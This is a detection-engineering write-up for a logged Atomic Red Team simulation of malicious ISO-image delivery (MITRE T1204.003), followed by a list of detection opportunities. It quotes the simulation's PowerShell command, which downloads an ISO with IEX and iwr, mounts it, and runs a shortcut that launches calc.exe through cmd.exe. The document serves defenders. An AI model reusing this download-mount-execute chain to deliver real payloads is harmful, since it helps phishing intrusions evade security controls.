# T1204.003-1: Malicious Image — Malicious Execution from Mounted ISO Image

## Technique Context

T1204.003 (Malicious Image) represents a critical user execution technique where attackers package malicious payloads within optical disc image files (ISO, IMG, etc.) to bypass email security controls and application whitelisting. This technique has gained significant popularity among threat actors because many email gateways don't scan inside ISO files, and Windows automatically mounts these images when double-clicked, making them appear as legitimate removable drives.

Attackers commonly use this technique to deliver initial access payloads, particularly through phishing campaigns. The ISO files often contain Windows shortcut files (.lnk) that execute malicious commands, scripts, or binaries when opened. This technique is effective because it appears legitimate to end users—they see what looks like a CD/DVD drive with familiar file types. The detection community focuses on monitoring ISO mounting events, execution from mounted drives, and the characteristic process chains that result from shortcut file execution.

## What This Dataset Contains

This dataset captures a complete execution chain of an ISO-based attack simulation:

**ISO Download and Mounting**: PowerShell script block logging (EID 4104) shows the complete command: `IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" -OutFile "$env:TEMP\qbot-test.iso")` followed by `Mount-DiskImage -ImagePath "$env:TEMP\qbot-test.iso"`. Sysmon EID 11 captures the file creation at `C:\Windows\Temp\qbot-test.iso`.

**Network Activity**: Sysmon EID 22 captures the DNS query for `raw.githubusercontent.com` and EID 3 shows the HTTPS connection to `185.199.109.133:443` for downloading the ISO.

**Drive Mounting Evidence**: PowerShell command invocation logs (EID 4103) show `Mount-DiskImage`, `Get-DiskImage`, and `Get-Volume` cmdlets being executed, with the script determining the mounted drive letter and constructing the path `D:\`.

**Malicious Execution Chain**: The process tree shows powershell.exe spawning cmd.exe with command line `"C:\Windows\system32\cmd.exe" /q /c calc.exe` (Security EID 4688), which then spawns calc.exe. Sysmon EID 1 captures the cmd.exe creation with CurrentDirectory set to `D:\`, confirming execution from the mounted ISO.

**LNK File Execution**: The PowerShell script shows execution of `.\calc.exe.lnk`, demonstrating the typical shortcut file execution pattern used in ISO-based attacks.

## What This Dataset Does Not Contain

**Direct LNK File Evidence**: While we see the execution result, there are no specific events capturing the .lnk file properties, target path, or the shortcut resolution process itself.

**ISO Mounting System Events**: The dataset lacks lower-level system events that would show the actual volume mounting, drive letter assignment, or filesystem notifications that accompany ISO mounting operations.

**File System Activity on Mounted Drive**: No Sysmon file creation events show files being accessed or enumerated on the mounted D:\ drive, which would be typical in real attacks when users explore the mounted ISO contents.

**Process Creation from ISO**: While we see cmd.exe execution, there's no Sysmon EID 1 for calc.exe creation, likely due to the include-mode filtering in the sysmon-modular configuration not matching calc.exe patterns.

**ISO Unmounting Events**: The dataset doesn't capture any dismount operations or cleanup activities.

## Assessment

This dataset provides excellent telemetry for detecting T1204.003 attacks through multiple complementary data sources. The PowerShell script block logging captures the complete attack flow including the ISO download URL, mounting commands, and directory traversal. Security event 4688 logs provide complete command-line visibility of the process execution chain. Sysmon network events show the download activity, and file creation events capture the ISO placement.

The combination of PowerShell cmdlet invocation logs and command-line process creation events makes this particularly valuable for detection engineering. The data clearly shows the progression from download to mount to execution, which is the standard kill chain for ISO-based attacks. However, the lack of lower-level volume mounting events and incomplete process creation coverage limits some detection opportunities focused on file system interactions.

## Detection Opportunities Present in This Data

1. **PowerShell ISO Mounting Commands** - Monitor for `Mount-DiskImage` cmdlet execution in PowerShell script blocks and command invocation logs, particularly when combined with web downloads.

2. **ISO File Downloads** - Detect PowerShell web requests (Invoke-WebRequest) with .iso file extensions in the -OutFile parameter or destination paths.

3. **Process Execution from Mounted Drives** - Monitor Security EID 4688 for processes with CurrentDirectory pointing to recently mounted drive letters (D:\, E:\, etc.).

4. **Network-to-Execution Chain** - Correlate network connections to file downloads followed by disk mounting operations within short time windows.

5. **CMD.exe with /c Parameter from PowerShell** - Detect cmd.exe process creation with /q /c parameters spawned by PowerShell, especially when the current directory is a mounted drive.

6. **PowerShell Directory Change to Drive Root** - Monitor Set-Location cmdlet usage changing to drive root paths (D:\, E:\) in PowerShell script blocks.

7. **Shortcut File Execution Patterns** - Look for execution of files ending in .lnk within PowerShell script contexts, particularly when combined with directory changes to mounted drives.

8. **Sequential PowerShell Storage Cmdlets** - Detect rapid succession of Mount-DiskImage, Get-DiskImage, and Get-Volume cmdlets as this represents the standard ISO mounting and path discovery pattern.
